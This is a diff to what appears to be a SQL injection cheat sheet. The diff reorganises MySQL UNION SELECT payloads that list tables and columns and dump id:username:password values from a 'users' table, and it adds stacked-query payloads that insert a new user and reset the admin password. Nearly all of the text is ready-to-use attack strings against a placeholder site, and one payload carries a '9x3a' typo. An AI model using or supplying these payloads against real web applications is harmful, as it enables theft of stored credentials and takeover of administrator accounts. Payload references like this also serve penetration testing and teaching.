@@ -244,22 +244,29 @@ Blind SQLi (Boolean / Time-based)
     page.asp?id=1 and 1=2 -- false
 ```
 
-Select/Union (Exfiltrating data):
+UNION SELECT (exfiltrating data):
 ```
 ns.agency/stuff.php?id=3 order by 1                                  
 ns.agency/stuff.php?id=0' union select 1,version(),database()--    // (MySQL) version + db name
 
-// (MySQL) list names of tables within the current database [result=emails, referers, uagents, users]
-ns.agency/stuff.php?id=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database()--
-// (MySQL) list names of columns within the "users" table [result=id, username, password]
-ns.agency/stuff.php?id=0' union select 1,group_concat(column_name),database() from information_schema.columns where table_schema=database() and table_name="users"--
-// (MySQL) list id:user:password values within the "users" table [result=id, username, password] [result=1:admin:admin]
-ns.agency/stuff.php?id=0' union select 1,group_concat(id,9x3a,username,0x3a,password,0x3a),database() from users--
+Dump usernames and passwords (MySQL)
+    // list names of tables within the current database [result=emails, referers, uagents, users]
+    ns.agency/stuff.php?id=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database()--
+    // list names of columns within the "users" table [result=id, username, password]
+    ns.agency/stuff.php?id=0' union select 1,group_concat(column_name),database() from information_schema.columns where table_schema=database() and table_name="users"--
+    // list id:user:password values within the "users" table [result=id, username, password] [result=1:admin:admin]
+    ns.agency/stuff.php?id=0' union select 1,group_concat(id,9x3a,username,0x3a,password,0x3a),database() from users--
 ```
 
-Insert:
+INSERT / UPDATE (adding or changing data):
 ```
-add stuff here
+Insert new users (MySQL)
+    // insert a new row into the "users" table with values id=99, username=newuser, password=newpass
+    ns.agency/stuff.php?id=0'; insert into users(id,username,password) values ('99','newuser','newpass');--
+
+Update admin password (MySQL)
+    // set password="1234" for a user called "admin"
+    ns.agency/stuff.php?id=0'; update users set password="1234" where username="admin";--
 ```
 
 Stacked Queries:
